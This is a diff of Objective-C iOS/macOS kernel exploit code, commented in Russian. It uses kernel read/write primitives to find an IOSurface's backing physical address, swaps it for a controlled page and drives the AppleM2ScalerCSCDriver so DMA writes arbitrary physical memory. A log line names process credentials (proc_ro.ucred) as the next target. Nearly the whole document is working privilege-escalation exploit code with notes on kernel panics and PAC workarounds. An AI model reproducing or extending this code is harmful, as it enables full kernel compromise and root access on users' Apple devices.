@@ -5721,15 +5721,31 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               (unsigned long long)(uint64_t)ctl, (unsigned long long)ctlPA]);
     if (!ctlPA) { [r appendString:@"FAIL: контрольный PA не получен\n"]; free(ctl); return r; }
 
-    // 2. find BOTH surface objects precisely: a heap page containing the
-    //    unique triple {ID, width=32, pixelFormat='BGRA'} within 0x400 bytes.
-    //    Then diff the two identical-layout objects: the field that differs
-    //    and looks like a PA (0x100xxxxxxxx) is the backing PA — the swap field.
+    // 2. АВТОРИТЕТНЫЙ backing PA (1.9.108): конец object-археологии (тройка
+    //    матчилась на scaler-конфиги, vtable PAC-солена — три промаха). Пиксели
+    //    dst-поверхности маппятся в наш процесс → backing PA = vtophys по нашей
+    //    pmap (как ctlPA выше). Санити: маркер в пиксели → phystokv(backingPA).
+    IOSurfaceLock(dstS, 0, NULL);
+    uint8_t *pix = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
+    if (pix) *(volatile uint32_t *)pix = 0x41544159;
+    IOSurfaceUnlock(dstS, 0, NULL);
+    if (!pix || !ttM) { [r appendString:@"FAIL: нет пиксельного VA/ttM\n"]; free(ctl); return r; }
+    uint64_t backingPA = vtophys(ttM, (uint64_t)pix);
+    uint64_t backKVA = (backingPA && gPrimitives.phystokv) ? gPrimitives.phystokv(backingPA) : 0;
+    uint32_t probe = 0;
+    BOOL proven = backKVA && kpRead(backKVA, &probe, 4, "backing vtophys proof", r) && probe == 0x41544159;
+    kpNote(r, [NSString stringWithFormat:@"  backing PA dst = %#llx (vtophys пикселей VA=%#llx), маркер по phystokv: %#x → %@",
+              (unsigned long long)backingPA, (unsigned long long)(uint64_t)pix, probe,
+              proven ? @"ПОДТВЕРЖДЁН" : @"НЕ СОШЛОСЬ — стоп (записей не будет)"]);
+    if (!backingPA || !proven) { free(ctl); return r; }
+
+    // 3. поле подмены: heap-скан (тип 0x21) на пару {backingPA, 0x4000} =
+    //    ranges[0] {pa, len} в IOMemoryDescriptor. Уникальная подпись.
     uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
-    uint64_t surfObjVA = 0, srcObjVA = 0;
     uint64_t totalPages = kconstant(physSize) >> 14;
-    int checked = 0;
-    for (uint64_t pg = 0; pg < totalPages && !(surfObjVA && srcObjVA); pg++) {
+    uint64_t hitVAs[8];
+    int hitN = 0;
+    for (uint64_t pg = 0; pg < totalPages && hitN < 8; pg++) {
         uint8_t ent[16];
         kreadbuf(tableVA + pg * 16, ent, 16);
         if (ent[2] != 0x21) continue;
@@ -5737,197 +5753,75 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
         if (!kva) continue;
         uint8_t buf[0x4000];
-        if (!kpRead(kva, buf, sizeof(buf), "iosurf triple scan", r)) continue;
-        checked++;
-        for (uint32_t o = 0; o + 0x400 <= sizeof(buf); o += 8) {
-            uint32_t v = 0;
-            memcpy(&v, buf + o, 4);
-            if (v != dstID && v != srcID) continue;
-            // triple check: width=32 and 'BGRA' nearby
-            BOOL hasW = NO, hasFmt = NO;
-            for (uint32_t w2 = 0; w2 + 4 <= 0x400; w2 += 4) {
-                uint32_t x = 0;
-                memcpy(&x, buf + o + w2, 4);
-                if (x == 32) hasW = YES;
-                if (x == 0x42475241) hasFmt = YES;
-            }
-            if (!hasW || !hasFmt) continue;
-            // candidate object base: scan ±0x400 for the object start via
-            // its vtable pointer (first qword is a tagged kernel pointer
-            // into the IOSurface kext range — but just take the ID region).
-            uint64_t obj = kva + o;
-            if (v == dstID && !surfObjVA) { surfObjVA = obj; kpNote(r, [NSString stringWithFormat:@"  dst объект @ %#llx (тройка ID+32+BGRA сошлась)", (unsigned long long)obj]); }
-            if (v == srcID && !srcObjVA) { srcObjVA = obj; kpNote(r, [NSString stringWithFormat:@"  src объект @ %#llx (тройка сошлась)", (unsigned long long)obj]); }
+        if (!kpRead(kva, buf, sizeof(buf), "paSwap pair scan", r)) continue;
+        for (uint32_t o = 0; o + 16 <= sizeof(buf); o += 8) {
+            uint64_t q = 0, q2 = 0;
+            memcpy(&q, buf + o, 8);
+            if (q != backingPA) continue;
+            memcpy(&q2, buf + o + 8, 8);
+            if (q2 != 0x4000) continue;
+            hitVAs[hitN++] = kva + o;
+            kpNote(r, [NSString stringWithFormat:@"  ★ пара {backingPA,0x4000} @ %#llx — поле ranges[0].pa", (unsigned long long)(kva + o)]);
+            if (hitN >= 8) break;
         }
     }
-    if (!(surfObjVA && srcObjVA)) {
-        kpNote(r, [NSString stringWithFormat:@"  объекты не найдены (dst=%@ src=%@, страниц %d) — layout/тип другой",
-                  surfObjVA ? @"есть" : @"нет", srcObjVA ? @"есть" : @"нет", checked]);
+    kpNote(r, [NSString stringWithFormat:@"  полей с парой {backingPA,0x4000}: %d", hitN]);
+    if (!hitN) {
+        kpNote(r, @"  пара не найдена в heap — записей не будет");
         free(ctl);
-        [r appendString:@"\n=== FAIL: объекты поверхностей не найдены ===\n"];
         return r;
     }
 
-    // 3. dump both and diff: find the backing PA field = PA-shaped value
-    //    that differs between two identical-layout surfaces.
-    // 1.9.102 (паника 080026): readBase=objVA-0x100 нырнул в СОСЕДНЮЮ страницу
-    // physmap — read-protected тип убил ядро. Читаем ТОЛЬКО выровненные
-    // страницы объектов; diff-окна выравниваем по ID-полю (layout одинаковый).
-    uint8_t pgD[0x4000], pgS[0x4000];
-    memset(pgD, 0, sizeof(pgD));
-    memset(pgS, 0, sizeof(pgS));
-    uint64_t pageD = surfObjVA & ~0x3FFFULL;
-    uint64_t pageS = srcObjVA & ~0x3FFFULL;
-    if (!kpRead(pageD, pgD, sizeof(pgD), "dst obj page", r)) { free(ctl); return r; }
-    if (!kpRead(pageS, pgS, sizeof(pgS), "src obj page", r)) { free(ctl); return r; }
-    uint32_t idOffD = (uint32_t)(surfObjVA - pageD);
-    uint32_t idOffS = (uint32_t)(srcObjVA - pageS);
-    // 1.9.104: PA-фильтр = реальный DRAM-диапазон (константа 0x10122000000
-    // проходила широкий фильтр и убивала нас дважды — паники 081559/082748)
-    uint64_t paLo = kconstant(physBase);
-    uint64_t paHi = paLo + kconstant(physSize);
-    // 1.9.106: конец скан-эвристикам (кандидаты-константы 0x10122000000).
-    // Якорь старта объекта по VTABLE: у dst и src один класс → одна vtable.
-    // 1.9.107: vtable на arm64e PAC-подписана солью=адрес объекта — сырые
-    // значения РАЗНЫЕ (видели в дампе M2-клиента: одна цель, семь солей).
-    // Сравниваем UNTAGGED и требуем kernel TEXT (top32 == 0xfffffff0):
-    // heap-указатели (0xffffffeX) и PA-константы (0x000001xx) отмирают.
-    uint64_t objStartD = 0, objStartS = 0;
-    for (uint32_t back = 8; back <= 0x400 && back <= idOffD && back <= idOffS; back += 8) {
-        uint64_t vd = 0, vs = 0;
-        memcpy(&vd, pgD + idOffD - back, 8);
-        memcpy(&vs, pgS + idOffS - back, 8);
-        uint64_t ud = kp_untag_ptr(vd), us = kp_untag_ptr(vs);
-        if (ud != us) continue;
-        if ((ud >> 32) != 0xfffffff0ULL) continue;
-        objStartD = surfObjVA - back;   // последний матч = самый дальний
-        objStartS = srcObjVA - back;
-    }
-    kpNote(r, [NSString stringWithFormat:@"  vtable-якорь: старт dst @ %#llx, src @ %#llx %@",
-              (unsigned long long)objStartD, (unsigned long long)objStartS,
-              objStartD ? @"" : @"— НЕ НАЙДЕН (дамп позади ID ниже)"]);
-    if (!objStartD) {
-        for (uint32_t back = 8; back <= 0x40 && back <= idOffD && back <= idOffS; back += 8) {
-            uint64_t vd = 0, vs = 0;
-            memcpy(&vd, pgD + idOffD - back, 8);
-            memcpy(&vs, pgS + idOffS - back, 8);
-            kpNote(r, [NSString stringWithFormat:@"    ID-%#02x: dst=%#018llx src=%#018llx", back,
-                      (unsigned long long)vd, (unsigned long long)vs]);
-        }
-    }
-
-    uint64_t candVA[16], candPA[16];
-    int candN = 0;
-    if (objStartD) {
-        // гард: объект не должен пересекать страницу (иначе якорь соскочил)
-        if (((objStartD ^ (objStartD + 0x368)) & ~0x3FFFULL) == 0) {
-            uint64_t rangesRef = 0, rcnt = 0;
-            kpRead(objStartD + 0x360, &rangesRef, 8, "iosurf ranges", r);
-            kpRead(objStartD + 0x3a4, &rcnt, 8, "iosurf rangeCount", r);
-            kpNote(r, [NSString stringWithFormat:@"  [start+0x360] ranges = %#llx, [start+0x3a4] rangeCount = %llu",
-                      (unsigned long long)rangesRef, (unsigned long long)rcnt]);
-            // inline-вариант: сам ranges — PA
-            if (rangesRef >= paLo && rangesRef < paHi && !(rangesRef & 0x3FFF)) {
-                candVA[candN] = objStartD + 0x360;
-                candPA[candN] = rangesRef;
-                candN++;
-            }
-            // обычный: ranges = указатель на IOMemoryDescriptor с ranges[0].pa
-            uint64_t u = kp_untag_ptr(rangesRef);
-            if (kpLooksLikeKernelPointer(u)) {
-                uint8_t d2[0x200];
-                memset(d2, 0, sizeof(d2));
-                uint64_t pageEnd = (u & ~0x3FFFULL) + 0x4000;
-                uint32_t sz2 = (u + sizeof(d2) <= pageEnd) ? (uint32_t)sizeof(d2) : (uint32_t)(pageEnd - u);
-                if (sz2 >= 8 && kpRead(u, d2, sz2, "iomd dump", r)) {
-                    for (uint32_t o2 = 0; o2 + 8 <= sz2 && candN < 16; o2 += 8) {
-                        uint64_t q2 = 0;
-                        memcpy(&q2, d2 + o2, 8);
-                        if (q2 >= paLo && q2 < paHi && !(q2 & 0x3FFF)) {
-                            candVA[candN] = u + o2;
-                            candPA[candN] = q2;
-                            kpNote(r, [NSString stringWithFormat:@"    кандидат(IOMD+%#x): PA=%#llx", o2, (unsigned long long)q2]);
-                            candN++;
-                        }
-                    }
-                }
-            }
-        } else {
-            kpNote(r, @"  якорь пересёк страницу — якорь неверен, стоп");
-            objStartD = 0;
-        }
-    }
-    kpNote(r, [NSString stringWithFormat:@"  кандидатов backing PA: %d — доказываю маркером каждый", candN]);
-
-    uint64_t hitVA = 0, dstPAval = 0;
-
-    // 4. доказательство маркером ПЕРЕБОРОМ кандидатов → подмена → submit
-    // Пишем 0x41544159 в пиксели dst (IOSurfaceLock) и читаем PA каждого
-    // кандидата через phystokv. Совпадение = backing доказан → пишем туда.
-    // Ни одного совпадения = записи НЕ БУДЕТ (ложный kwrite = zbound panic).
-    uint64_t origPA = 0;
-    {
-        uint32_t marker = 0x41544159;
-        IOSurfaceLock(dstS, 0, NULL);
-        uint8_t *pix = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
-        if (pix) *(volatile uint32_t *)pix = marker;
-        IOSurfaceUnlock(dstS, 0, NULL);
-        for (int i = 0; i < candN && !hitVA; i++) {
-            uint64_t ck = gPrimitives.phystokv ? gPrimitives.phystokv(candPA[i]) : 0;
-            uint32_t probe = 0;
-            if (ck && kpRead(ck, &probe, 4, "backing proof", r) && probe == marker) {
-                hitVA = candVA[i];
-                dstPAval = candPA[i];
-                kpNote(r, [NSString stringWithFormat:@"  ★ PROOF: кандидат #%d PA=%#llx @ %#llx — backing ПОДТВЕРЖДЁН маркером",
-                          i, (unsigned long long)dstPAval, (unsigned long long)hitVA]);
-            }
-        }
-        if (!hitVA)
-            kpNote(r, @"  PROOF: ни один кандидат не совпал с маркером — backing не найден, записи НЕ БУДЕТ");
-    }
-    if (hitVA) {
-        kreadbuf(hitVA, &origPA, 8);
-        kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА backing %#llx → %#llx (контрольная)", (unsigned long long)origPA, (unsigned long long)ctlPA]);
-        kwritebuf(hitVA, &ctlPA, 8);
-        uint64_t rb = 0;
-        kreadbuf(hitVA, &rb, 8);
-        kpNote(r, [NSString stringWithFormat:@"  readback = %#llx %@", (unsigned long long)rb, rb == ctlPA ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
-    } else {
-        kpNote(r, @"  поле backing не найден — submit без подмены (контроль не изменится; дамп выше для layout)");
-    }
-
-    // 5. submit the scaler with dstID — DMA writes result into our control page
+    // 4. per-hit: подмена → submit → проверка контрольной → restore.
+    //    Попаданий может быть несколько (кэш объекта + дескриптор) — тестируем
+    //    по одному, так узнаём, какое поле реально питает DMA.
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("AppleM2ScalerCSCDriver"));
-    kern_return_t skr = 0;
-    if (svc) {
-        io_connect_t conn = 0;
-        skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
-        if (skr == KERN_SUCCESS && conn) {
-            uint8_t tsd[0x1B0];
-            memset(tsd, 0, sizeof(tsd));
-            *(uint32_t *)(tsd + 0) = srcID;
-            *(uint32_t *)(tsd + 4) = dstID;
-            skr = IOConnectCallMethod(conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
-            kpNote(r, [NSString stringWithFormat:@"  scaler submit (sel 1): kr=0x%x (%s)", skr, mach_error_string(skr)]);
-            IOServiceClose(conn);
+    int confirmed = -1;
+    for (int h = 0; h < hitN; h++) {
+        uint64_t hv = hitVAs[h];
+        uint64_t origPA = 0;
+        kreadbuf(hv, &origPA, 8);
+        if (origPA != backingPA) {
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origPA]);
+            continue;
         }
-        IOObjectRelease(svc);
+        kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#llx → %#llx (контрольная)", h, (unsigned long long)origPA, (unsigned long long)ctlPA]);
+        kwritebuf(hv, &ctlPA, 8);
+        uint64_t rb = 0;
+        kreadbuf(hv, &rb, 8);
+        kpNote(r, [NSString stringWithFormat:@"  readback = %#llx %@", (unsigned long long)rb, rb == ctlPA ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
+        if (svc) {
+            io_connect_t conn = 0;
+            kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            if (skr == KERN_SUCCESS && conn) {
+                uint8_t tsd[0x1B0];
+                memset(tsd, 0, sizeof(tsd));
+                *(uint32_t *)(tsd + 0) = srcID;
+                *(uint32_t *)(tsd + 4) = dstID;
+                skr = IOConnectCallMethod(conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
+                kpNote(r, [NSString stringWithFormat:@"  scaler submit (sel 1): kr=0x%x (%s)", skr, mach_error_string(skr)]);
+                IOServiceClose(conn);
+            }
+        }
+        usleep(100000);   // DMA докручивается
+        int changed = 0;
+        for (uint32_t i = 0; i < 0x4000; i += 4) {
+            uint32_t px = *(volatile uint32_t *)(ctl + i);
+            if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
+        }
+        kwritebuf(hv, &origPA, 8);   // restore сразу — не оставляем коррупцию
+        if (changed) {
+            confirmed = h;
+            kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: hit #%d @ %#llx — контрольная страница изменена DMA (%u dword). Дальше цель = страница proc_ro.ucred ===",
+                      h, (unsigned long long)hv, changed]);
+            break;
+        }
+        kpNote(r, [NSString stringWithFormat:@"  hit #%d: контрольная не изменилась — restore, следующий", h]);
     }
-
-    // 6. verdict: did the control page get written by DMA?
-    int changed = 0;
-    for (uint32_t i = 0; i < 0x4000; i += 4) {
-        uint32_t px = *(volatile uint32_t *)(ctl + i);
-        if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
-    }
-    if (changed) {
-        kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — подмена backing работает, дальше подставляем защищённую страницу ===", changed]);
-    } else {
-        kpNote(r, @"  контрольная страница не изменилась — scaler не записал (submit отклонён/DART проверил тип страницы?)");
-    }
-    // restore (don't leave the surface corrupted for later runs)
-    if (hitVA && origPA) kwritebuf(hitVA, &origPA, 8);
+    if (confirmed < 0)
+        kpNote(r, @"=== ни одно поле не питает DMA (или DART отказал) — см. выше ===");
+    if (svc) IOObjectRelease(svc);
     free(ctl);
     return r;
 }
